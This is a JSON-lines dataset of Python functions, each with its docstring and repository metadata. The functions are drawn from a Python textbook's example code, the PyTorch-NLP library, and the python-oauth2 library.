{"docstring": "# Initialize pygame, settings, and screen object.\n", "func_signal": "def run_game():\n", "code": "pygame.init()\nai_settings = Settings()\nscreen = pygame.display.set_mode(\n    (ai_settings.screen_width, ai_settings.screen_height))\npygame.display.set_caption(\"Alien Invasion\")\n\n# Set the background color.\nbg_color = (230, 230, 230)\n\n# Make a ship.\nship = Ship(ai_settings, screen)\n\n# Start the main loop for the game.\nwhile True:\n    gf.check_events(ship)\n    ship.update()\n    gf.update_screen(ai_settings, screen, ship)", "path": "pcc/chapter_12/restore_points/restore_point_1_ship_moves/alien_invasion.py", "commit_date": "2016-01-20 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Update the ship's position based on movement flags.\"\"\"\n# Update the ship's center value, not the rect.\n", "func_signal": "def update(self):\n", "code": "if self.moving_right and self.rect.right < self.screen_rect.right:\n    self.center += self.ai_settings.ship_speed_factor\nif self.moving_left and self.rect.left > 0:\n    self.center -= self.ai_settings.ship_speed_factor\n\n# Update rect object from self.center.\nself.rect.centerx = self.center", "path": "pcc/chapter_12/restore_points/restore_point_1_ship_moves/ship.py", "commit_date": "2016-01-20 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Summarize the pizza we are about to make.\"\"\"\n", "func_signal": "def make_pizza(size, *toppings):\n", "code": "print(\"\\nMaking a \" + str(size) +\n      \"-inch pizza with the following toppings:\")\nfor topping in toppings:\n    print(\"- \" + topping)", "path": "pcc/chapter_08/pizza.py", "commit_date": "2015-09-27 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Turn the score into a rendered image.\"\"\"\n", "func_signal": "def prep_score(self):\n", "code": "rounded_score = int(round(self.stats.score, -1))\nscore_str = \"{:,}\".format(rounded_score)\nself.score_image = self.font.render(score_str, True, self.text_color,\n    self.ai_settings.bg_color)\n    \n# Display the score at the top right of the screen.\nself.score_rect = self.score_image.get_rect()\nself.score_rect.right = self.screen_rect.right - 20\nself.score_rect.top = 20", "path": "pcc/chapter_14/scoreboard.py", "commit_date": "2015-07-18 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Test that a single response is stored properly.\"\"\"\n", "func_signal": "def test_store_single_response(self):\n", "code": "self.my_survey.store_response(self.responses[0])\nself.assertIn(self.responses[0], self.my_survey.responses)", "path": "pcc/chapter_11/test_survey.py", "commit_date": "2015-09-27 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"\nCreate a survey and a set of responses for use in all test methods.\n\"\"\"\n", "func_signal": "def setUp(self):\n", "code": "question = \"What language did you first learn to speak?\"\nself.my_survey = AnonymousSurvey(question)\nself.responses = ['English', 'Spanish', 'Mandarin']", "path": "pcc/chapter_11/test_survey.py", "commit_date": "2015-09-27 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Turn the high score into a rendered image.\"\"\"\n", "func_signal": "def prep_high_score(self):\n", "code": "high_score = int(round(self.stats.high_score, -1))\nhigh_score_str = \"{:,}\".format(high_score)\nself.high_score_image = self.font.render(high_score_str, True,\n    self.text_color, self.ai_settings.bg_color)\n        \n# Center the high score at the top of the screen.\nself.high_score_rect = self.high_score_image.get_rect()\nself.high_score_rect.centerx = self.screen_rect.centerx\nself.high_score_rect.top = self.score_rect.top", "path": "pcc/chapter_14/scoreboard.py", "commit_date": "2015-07-18 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Update the ship's position, based on movement flags.\"\"\"\n# Update the ship's center value, not the rect.\n", "func_signal": "def update(self):\n", "code": "if self.moving_right and self.rect.right < self.screen_rect.right:\n    self.center += self.ai_settings.ship_speed_factor\nif self.moving_left and self.rect.left > 0:\n    self.center -= self.ai_settings.ship_speed_factor\n    \n# Update rect object from self.center.\nself.rect.centerx = self.center", "path": "pcc/chapter_12/ship.py", "commit_date": "2015-07-18 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Turn the level into a rendered image.\"\"\"\n", "func_signal": "def prep_level(self):\n", "code": "self.level_image = self.font.render(str(self.stats.level), True,\n        self.text_color, self.ai_settings.bg_color)\n\n# Position the level below the score.\nself.level_rect = self.level_image.get_rect()\nself.level_rect.right = self.score_rect.right\nself.level_rect.top = self.score_rect.bottom + 10", "path": "pcc/chapter_14/scoreboard.py", "commit_date": "2015-07-18 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Build a dictionary containing everything we know about a user.\"\"\"\n", "func_signal": "def build_profile(first, last, **user_info):\n", "code": "profile = {}\nprofile['first_name'] = first\nprofile['last_name'] = last\nfor key, value in user_info.items():\n    profile[key] = value\nreturn profile", "path": "pcc/chapter_08/user_profile.py", "commit_date": "2015-09-27 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Test that three individual responses are stored properly.\"\"\"\n", "func_signal": "def test_store_three_responses(self):\n", "code": "for response in self.responses:\n    self.my_survey.store_response(response)\nfor response in self.responses:\n    self.assertIn(response, self.my_survey.responses)", "path": "pcc/chapter_11/test_survey.py", "commit_date": "2015-09-27 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Count the approximate number of words in a file.\"\"\"\n", "func_signal": "def count_words(filename):\n", "code": "try:\n    with open(filename, encoding='utf-8') as f_obj:\n        contents = f_obj.read() \nexcept FileNotFoundError:\n    pass\nelse:\n    # Count approximate number of words in the file.\n    words = contents.split()\n    num_words = len(words)\n    print(\"The file \" + filename + \" has about \" + str(num_words) + \" words.\")", "path": "pcc/chapter_10/word_count.py", "commit_date": "2017-08-21 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Initialize the ship, and set its starting position.\"\"\"\n", "func_signal": "def __init__(self, ai_settings, screen):\n", "code": "self.screen = screen\nself.ai_settings = ai_settings\n\n# Load the ship image, and get its rect.\nself.image = pygame.image.load('images/ship.bmp')\nself.rect = self.image.get_rect()\nself.screen_rect = screen.get_rect()\n\n# Start each new ship at the bottom center of the screen.\nself.rect.centerx = self.screen_rect.centerx\nself.rect.bottom = self.screen_rect.bottom\n\n# Store a decimal value for the ship's center.\nself.center = float(self.rect.centerx)\n\n# Movement flags.\nself.moving_right = False\nself.moving_left = False", "path": "pcc/chapter_12/ship.py", "commit_date": "2015-07-18 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Initialize scorekeeping attributes.\"\"\"\n", "func_signal": "def __init__(self, ai_settings, screen, stats):\n", "code": "self.screen = screen\nself.screen_rect = screen.get_rect()\nself.ai_settings = ai_settings\nself.stats = stats\n\n# Font settings for scoring information.\nself.text_color = (30, 30, 30)\nself.font = pygame.font.SysFont(None, 48)\n\n# Prepare the initial score images.\nself.prep_score()\nself.prep_high_score()\nself.prep_level()\nself.prep_ships()", "path": "pcc/chapter_14/scoreboard.py", "commit_date": "2015-07-18 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Prompt for a new username.\"\"\"\n", "func_signal": "def get_new_username():\n", "code": "username = input(\"What is your name? \")\nfilename = 'username.json'\nwith open(filename, 'w') as f_obj:\n    json.dump(username, f_obj)\nreturn username", "path": "pcc/chapter_10/remember_me.py", "commit_date": "2015-10-19 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Initialize the ship and set its starting position.\"\"\"\n", "func_signal": "def __init__(self, ai_settings, screen):\n", "code": "self.screen = screen\nself.ai_settings = ai_settings\n# Load the ship image and get its rect.\nself.image = pygame.image.load('images/ship.bmp')\nself.rect = self.image.get_rect()\nself.screen_rect = screen.get_rect()\n# Start each new ship at the bottom center of the screen.\nself.rect.centerx = self.screen_rect.centerx\nself.rect.bottom = self.screen_rect.bottom\n\n# Store a decimal value for the ship's center.\nself.center = float(self.rect.centerx)\n\n# Movement flags\nself.moving_right = False\nself.moving_left = False", "path": "pcc/chapter_12/restore_points/restore_point_1_ship_moves/ship.py", "commit_date": "2016-01-20 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Greet the user by name.\"\"\"\n", "func_signal": "def greet_user():\n", "code": "username = get_stored_username()\nif username:\n    print(\"Welcome back, \" + username + \"!\")\nelse:\n    username = get_new_username()\n    print(\"We'll remember you when you come back, \" + username + \"!\")", "path": "pcc/chapter_10/remember_me.py", "commit_date": "2015-10-19 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\"Get stored username if available.\"\"\"\n", "func_signal": "def get_stored_username():\n", "code": "filename = 'username.json'\ntry:\n    with open(filename) as f_obj:\n        username = json.load(f_obj)\nexcept FileNotFoundError:\n    return None\nelse:\n    return username", "path": "pcc/chapter_10/remember_me.py", "commit_date": "2015-10-19 00:00:00", "repo_name": "ehmatthes/pcc", "stars": 2883, "license": "None", "language": "python", "size": 20693}
{"docstring": "\"\"\" Converts an escaped token string to a list of subtoken strings.\n\nArgs:\n  escaped_token: An escaped token as a unicode string.\nReturns:\n  A list of subtokens as unicode strings.\n\"\"\"\n# NOTE: This algorithm is greedy; it won't necessarily produce the \"best\"\n# list of subtokens.\n", "func_signal": "def _escaped_token_to_subtoken_strings(self, escaped_token):\n", "code": "ret = []\nstart = 0\ntoken_len = len(escaped_token)\nwhile start < token_len:\n    for end in six.moves.xrange(min(token_len, start + self._max_subtoken_len), start, -1):\n        subtoken = escaped_token[start:end]\n        if subtoken in self._all_subtoken_strings:\n            ret.append(subtoken)\n            start = end\n            break\n\n    else:  # Did not break\n        # If there is no possible encoding of the escaped token then one of the\n        # characters in the token is not in the alphabet. This should be\n        # impossible and would be indicative of a bug.\n        assert False, \"Token substring not found in subtoken vocabulary.\"\n\nreturn ret", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "# Input is (seq, batch, input)\n", "func_signal": "def test_weight_drop_linear():\n", "code": "x = torch.randn(2, 1, 10)\n\nlin = WeightDropLinear(10, 10, weight_dropout=0.9)\nrun1 = [x.sum() for x in lin(x).data]\nrun2 = [x.sum() for x in lin(x).data]\n\nassert run1[0] != run2[0]\nassert run1[1] != run2[1]", "path": "PyTorch-NLP/tests/nn/test_weight_drop.py", "commit_date": "2018-11-29 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\" Decorator alias for `fork_rng`.\n\"\"\"\n", "func_signal": "def fork_rng_wrap(function=None, **kwargs):\n", "code": "if not function:\n    return functools.partial(fork_rng_wrap, **kwargs)\n\n@functools.wraps(function)\ndef wrapper():\n    with fork_rng(**kwargs):\n        return function()\n\nreturn wrapper", "path": "PyTorch-NLP/torchnlp/random.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\"Bisection to find the right size.\"\"\"\n", "func_signal": "def bisect(min_val, max_val):\n", "code": "present_count = (max_val + min_val) // 2\nlogger.info(\"Trying min_count %d\" % present_count)\nsubtokenizer = cls()\nsubtokenizer.build_from_token_counts(token_counts, present_count, num_iterations)\nlogger.info(\"min_count %d attained a %d vocab_size\", present_count,\n            subtokenizer.vocab_size)\n\n# If min_val == max_val, we can't do any better than this.\nif subtokenizer.vocab_size == target_size or min_val >= max_val:\n    return subtokenizer\n\nif subtokenizer.vocab_size > target_size:\n    other_subtokenizer = bisect(present_count + 1, max_val)\nelse:\n    other_subtokenizer = bisect(min_val, present_count - 1)\n\nif other_subtokenizer is None:\n    return subtokenizer\n\nif (abs(other_subtokenizer.vocab_size - target_size) <\n        abs(subtokenizer.vocab_size - target_size)):\n    return other_subtokenizer\nreturn subtokenizer", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\"\nEncode a unicode string as a list of tokens.\nArgs:\n  text: a unicode string\nReturns:\n  a list of tokens as Unicode strings\n\"\"\"\n", "func_signal": "def encode(text):\n", "code": "if not text:\n    return []\nret = []\ntoken_start = 0\n# Classify each character in the input string\nis_alnum = [c in get_alphanumeric_char_set() for c in text]\nfor pos in six.moves.xrange(1, len(text)):\n    if is_alnum[pos] != is_alnum[pos - 1]:\n        token = text[token_start:pos]\n        if token != u\" \" or token_start == 0:\n            ret.append(token)\n        token_start = pos\nfinal_token = text[token_start:]\nret.append(final_token)\nreturn ret", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "# https://github.com/PetrochukM/PyTorch-NLP/issues/44\n", "func_signal": "def test_spacy_encoder_issue_44():\n", "code": "encoder = SpacyEncoder([\"This ain't funny.\"])\nassert 'ai' in encoder.vocab\nassert 'n\\'t' in encoder.vocab", "path": "PyTorch-NLP/tests/encoders/text/test_spacy_encoder.py", "commit_date": "2019-04-09 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "# TEST adapted from example in http://www.nltk.org/_modules/nltk/tokenize/treebank.html\n", "func_signal": "def test_treebank_encoder(encoder, input_):\n", "code": "expected_tokens = [\n    'Good', 'muffins', 'cost', '$', '3.88', 'in', 'New', 'York.', 'Please', 'buy', 'me', 'two',\n    'of', 'them.', 'Thanks', '.'\n]\nexpected_decode = \"Good muffins cost $3.88 in New York. Please buy me two of them. Thanks.\"\ntokens = encoder.encode(input_)\nassert [encoder.index_to_token[i] for i in tokens] == expected_tokens\nassert encoder.decode(tokens) == expected_decode", "path": "PyTorch-NLP/tests/encoders/text/test_treebank_encoder.py", "commit_date": "2019-10-20 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\"\nInverse of _escape_token().\nArgs:\n  escaped_token: a unicode string\nReturns:\n  token: a unicode string\n\"\"\"\n\n", "func_signal": "def _unescape_token(escaped_token):\n", "code": "def match(m):\n    if m.group(1) is None:\n        return u\"_\" if m.group(0) == u\"\\\\u\" else u\"\\\\\"\n\n    try:\n        return six.unichr(int(m.group(1)))\n    except (ValueError, OverflowError):\n        return \"\"\n\ntrimmed = escaped_token[:-1] if escaped_token.endswith(\"_\") else escaped_token\nreturn _UNESCAPE_REGEX.sub(match, trimmed)", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\"Wraps hidden states in new Tensors, to detach them from their history.\"\"\"\n", "func_signal": "def repackage_hidden(h):\n", "code": "if isinstance(h, torch.Tensor):\n    return h.detach()\nelse:\n    return tuple(repackage_hidden(v) for v in h)", "path": "PyTorch-NLP/examples/awd-lstm-lm/utils.py", "commit_date": "2018-05-05 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\" Load the module and insert it into the parent's globals. \"\"\"\n\n# Import the target module and insert it into the parent's namespace\n", "func_signal": "def _load(self):\n", "code": "module = importlib.import_module(self.__name__)\nself._parent_module_globals[self._local_name] = module\n\n# Update this object's dict so that if someone keeps a reference to the\n#   LazyLoader, lookups are efficient (__getattr__ is only called on lookups\n#   that fail).\nself.__dict__.update(module.__dict__)\n\nreturn module", "path": "PyTorch-NLP/torchnlp/_third_party/lazy_loader.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\" Forks the `torch`, `numpy` and `random` random generators, so that when you return, the\nrandom generators are reset to the state that they were previously in.\n\nArgs:\n    seed (int or None, optional): If defined this sets the seed values for the random\n        generator fork. This is a convenience parameter.\n    cuda (bool, optional): If `True` saves the `cuda` seed also. Getting and setting the random\n        generator state can be quite slow if you have a lot of GPUs.\n\"\"\"\n", "func_signal": "def fork_rng(seed=None, cuda=torch.cuda.is_available()):\n", "code": "state = get_random_generator_state(cuda)\nif seed is not None:\n    set_seed(seed, cuda)\ntry:\n    yield\nfinally:\n    set_random_generator_state(state)", "path": "PyTorch-NLP/torchnlp/random.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\"Return embedding for token or for UNK if token not in vocabulary\"\"\"\n", "func_signal": "def _get_token_vector(self, token):\n", "code": "if token in self.token_to_index:\n    return self.vectors[self.token_to_index[token]]\nelse:\n    return self.unk_init(torch.Tensor(self.dim))", "path": "PyTorch-NLP/torchnlp/word_to_vector/pretrained_word_vectors.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\"Initialize alphabet from an iterable of token or subtoken strings.\"\"\"\n# Include all characters from all tokens in the alphabet to guarantee that\n# any token can be encoded. Additionally, include all escaping\n# characters.\n", "func_signal": "def _init_alphabet_from_tokens(self, tokens):\n", "code": "self._alphabet = {c for token in tokens for c in token}\nself._alphabet |= _ESCAPE_CHARS", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\" Set seed values for random generators.\n\nArgs:\n    seed (int): Value used as a seed.\n    cuda (bool, optional): If `True` sets the `cuda` seed also.\n\"\"\"\n", "func_signal": "def set_seed(seed, cuda=torch.cuda.is_available()):\n", "code": "random.seed(seed)\ntorch.manual_seed(seed)\nnp.random.seed(seed)\nif cuda:  # pragma: no cover\n    torch.cuda.manual_seed(seed)\n    torch.cuda.manual_seed_all(seed)", "path": "PyTorch-NLP/torchnlp/random.py", "commit_date": "2020-09-06 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "# Samplers iterate over chunks similar to:\n# https://github.com/pytorch/examples/blob/c66593f1699ece14a4a2f4d314f1afb03c6793d9/word_language_model/main.py#L112\n", "func_signal": "def __iter__(self):\n", "code": "self.iterators = [iter(value['sampler']) for value in self.samplers]\nwhile True:\n    batch = []\n    for i, iterator in enumerate(self.iterators):\n        try:\n            # Adjust the sampler indices to the offset\n            offset = self.samplers[i]['offset']\n            slice_ = next(iterator)\n            batch.append(slice(slice_.start + offset, slice_.stop + offset))\n        except StopIteration:\n            pass\n\n    # Samplers are all empty\n    if (len(batch) == 0):\n        break\n\n    yield batch", "path": "PyTorch-NLP/torchnlp/samplers/bptt_batch_sampler.py", "commit_date": "2019-10-20 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\"Train a SubwordTextTokenizer based on a dictionary of word counts.\n\nArgs:\n  token_counts: a dictionary of Unicode strings to int.\n  min_count: an integer - discard subtokens with lower counts.\n  num_iterations: an integer; how many iterations of refinement.\n\"\"\"\n", "func_signal": "def build_from_token_counts(self, token_counts, min_count, num_iterations=4):\n", "code": "self._init_alphabet_from_tokens(six.iterkeys(token_counts))\n\n# Bootstrap the initial list of subtokens with the characters from the\n# alphabet plus the escaping characters.\nself._init_subtokens_from_list(list(self._alphabet))\n\n# We build iteratively.  On each iteration, we segment all the words,\n# then count the resulting potential subtokens, keeping the ones\n# with high enough counts for our new vocabulary.\nif min_count < 1:\n    min_count = 1\nfor i in six.moves.xrange(num_iterations):\n\n    # Collect all substrings of the encoded token that break along current\n    # subtoken boundaries.\n    subtoken_counts = collections.defaultdict(int)\n    for token, count in six.iteritems(token_counts):\n        escaped_token = _escape_token(token, self._alphabet)\n        subtokens = self._escaped_token_to_subtoken_strings(escaped_token)\n        start = 0\n        for subtoken in subtokens:\n            for end in six.moves.xrange(start + 1, len(escaped_token) + 1):\n                new_subtoken = escaped_token[start:end]\n                subtoken_counts[new_subtoken] += count\n            start += len(subtoken)\n\n    # Array of sets of candidate subtoken strings, by length.\n    len_to_subtoken_strings = []\n    for subtoken_string, count in six.iteritems(subtoken_counts):\n        lsub = len(subtoken_string)\n        if count >= min_count:\n            while len(len_to_subtoken_strings) <= lsub:\n                len_to_subtoken_strings.append(set())\n            len_to_subtoken_strings[lsub].add(subtoken_string)\n\n    # Consider the candidates longest to shortest, so that if we accept\n    # a longer subtoken string, we can decrement the counts of its\n    # prefixes.\n    new_subtoken_strings = []\n    for lsub in six.moves.xrange(len(len_to_subtoken_strings) - 1, 0, -1):\n        subtoken_strings = len_to_subtoken_strings[lsub]\n        for subtoken_string in subtoken_strings:\n            count = subtoken_counts[subtoken_string]\n            if count >= min_count:\n                # Exclude alphabet tokens here, as they must be included later,\n                # explicitly, regardless of count.\n                if subtoken_string not in self._alphabet:\n                    new_subtoken_strings.append((count, subtoken_string))\n                for l in six.moves.xrange(1, lsub):\n                    subtoken_counts[subtoken_string[:l]] -= count\n\n    # Include the alphabet explicitly to guarantee all strings are\n    # encodable.\n    new_subtoken_strings.extend((subtoken_counts.get(a, 0), a) for a in self._alphabet)\n    new_subtoken_strings.sort(reverse=True)\n\n    # Reinitialize to the candidate vocabulary.\n    self._init_subtokens_from_list([subtoken for _, subtoken in new_subtoken_strings])", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\"Initialize token information from a list of subtoken strings.\"\"\"\n# we remember the maximum length of any subtoken to avoid having to\n# check arbitrarily long strings.\n", "func_signal": "def _init_subtokens_from_list(self, subtoken_strings):\n", "code": "self._all_subtoken_strings = set([s for s in subtoken_strings if s])\nself._max_subtoken_len = max([len(s) for s in subtoken_strings])", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\" Converts a list of subtoken to a list of tokens.\n\nArgs:\n  subtokens: a list of integers in the range [0, vocab_size)\n\nReturns:\n  a list of strings.\n\"\"\"\n", "func_signal": "def _subtoken_to_tokens(self, subtokens):\n", "code": "concatenated = \"\".join(subtokens)\nsplit = concatenated.split(\"_\")\nreturn [_unescape_token(t + \"_\") for t in split if t]", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\" Converts a list of tokens to a list of subtoken.\n\nArgs:\n  tokens: a list of strings.\nReturns:\n  a list of integers in the range [0, vocab_size)\n\"\"\"\n", "func_signal": "def _tokens_to_subtoken(self, tokens):\n", "code": "ret = []\nfor token in tokens:\n    ret.extend(\n        self._escaped_token_to_subtoken_strings(_escape_token(token, self._alphabet)))\nreturn ret", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\" This set contains all letter and number characters. \"\"\"\n", "func_signal": "def get_alphanumeric_char_set():\n", "code": "return set(\n    six.unichr(i)\n    for i in six.moves.xrange(sys.maxunicode)\n    if (unicodedata.category(six.unichr(i)).startswith(\"L\") or\n        unicodedata.category(six.unichr(i)).startswith(\"N\")))", "path": "PyTorch-NLP/torchnlp/encoders/text/subword_text_tokenizer.py", "commit_date": "2019-10-21 00:00:00", "repo_name": "PetrochukM/PyTorch-NLP", "stars": 2204, "license": "bsd-3-clause", "language": "python", "size": 13169}
{"docstring": "\"\"\"Build an XOAUTH string for use in SMTP/IMPA authentication.\"\"\"\n", "func_signal": "def build_xoauth_string(url, consumer, token=None):\n", "code": "request = Request.from_consumer_and_token(consumer, token,\n    \"GET\", url)\n\nsigning_method = SignatureMethod_HMAC_SHA1()\nrequest.sign_request(signing_method, consumer, token)\n\nparams = []\nfor k, v in sorted(request.items()):\n    if v is not None:\n        params.append('%s=\"%s\"' % (k, escape(v)))\n\nreturn \"%s %s %s\" % (\"GET\", url, ','.join(params))", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"\nRaise TypeError if x is a str containing non-utf8 bytes or if x is\nan iterable which contains such a str.\n\"\"\"\n", "func_signal": "def to_unicode_optional_iterator(x):\n", "code": "if isinstance(x, STRING_TYPES):\n    return to_unicode(x)\n\ntry:\n    l = list(x)\nexcept TypeError as e:\n    assert 'is not iterable' in str(e)\n    return x\nelse:\n    return [ to_unicode(e) for e in l ]", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Get any non-OAuth parameters.\"\"\"\n", "func_signal": "def get_nonoauth_parameters(self):\n", "code": "return dict([(k, v) for k, v in self.items() \n            if not k.startswith('oauth_')])", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Return an OAuth Request object for the current request.\"\"\"\n\n", "func_signal": "def get_oauth_request(self):\n", "code": "try:\n    method = os.environ['REQUEST_METHOD']\nexcept:\n    method = 'GET'\n\npostdata = None\nif method in ('POST', 'PUT'):\n    postdata = self.request.body\n\nreturn oauth.Request.from_request(method, self.request.uri,\n    headers=self.request.headers, query_string=postdata)", "path": "python-oauth2/example/appengine_oauth.py", "commit_date": "2013-05-29 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Verify that timestamp is recentish.\"\"\"\n", "func_signal": "def _check_timestamp(self, timestamp):\n", "code": "timestamp = int(timestamp)\nnow = int(time.time())\nlapsed = now - timestamp\nif lapsed > self.timestamp_threshold:\n    raise Error('Expired timestamp: given %d and now %s has a '\n        'greater difference than threshold %d' % (timestamp, now, \n            self.timestamp_threshold))", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Serialize as a URL for a GET request.\"\"\"\n", "func_signal": "def to_url(self):\n", "code": "base_url = urlparse(self.url)\n\nif PY3:\n    query = parse_qs(base_url.query)\n    for k, v in self.items():\n        query.setdefault(k, []).append(to_utf8_optional_iterator(v))\n    scheme = base_url.scheme\n    netloc = base_url.netloc\n    path = base_url.path\n    params = base_url.params\n    fragment = base_url.fragment\nelse:\n    query = parse_qs(to_utf8(base_url.query))\n    for k, v in self.items():\n        query.setdefault(to_utf8(k), []).append(to_utf8_optional_iterator(v))\n    scheme = to_utf8(base_url.scheme)\n    netloc = to_utf8(base_url.netloc)\n    path = to_utf8(base_url.path)\n    params = to_utf8(base_url.params)\n    fragment = to_utf8(base_url.fragment)\n\nurl = (scheme, netloc, path, params, urlencode(query, True), fragment)\nreturn urlunparse(url)", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
{"docstring": "\"\"\"Verifies an api call and checks all the parameters.\"\"\"\n\n", "func_signal": "def verify_request(self, request, consumer, token):\n", "code": "self._check_version(request)\nself._check_signature(request, consumer, token)\nparameters = request.get_nonoauth_parameters()\nreturn parameters", "path": "python-oauth2/oauth2/__init__.py", "commit_date": "2018-02-12 00:00:00", "repo_name": "joestump/python-oauth2", "stars": 2986, "license": "mit", "language": "python", "size": 456}
